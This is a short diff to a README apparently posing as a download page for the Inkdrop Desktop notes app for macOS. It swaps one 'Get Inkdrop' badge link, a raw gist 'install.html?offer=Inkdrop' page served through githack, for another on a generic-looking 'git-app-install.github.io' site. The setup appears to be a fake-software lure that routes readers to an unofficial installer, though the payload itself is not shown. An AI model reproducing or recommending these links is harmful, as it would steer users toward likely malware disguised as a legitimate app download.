@@ -1,6 +1,6 @@
 # Inkdrop Desktop — Markdown Notes macOS
 
-<a href="https://gistcdn.githack.com/finklousen165/b225c8104b9f911b73fdd4cfceb45283/raw/5ce56c8b5de420eb30b53da4ed2d3b9b3e8d5ce6/install.html?offer=Inkdrop" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=Inkdrop" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Inkdrop%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
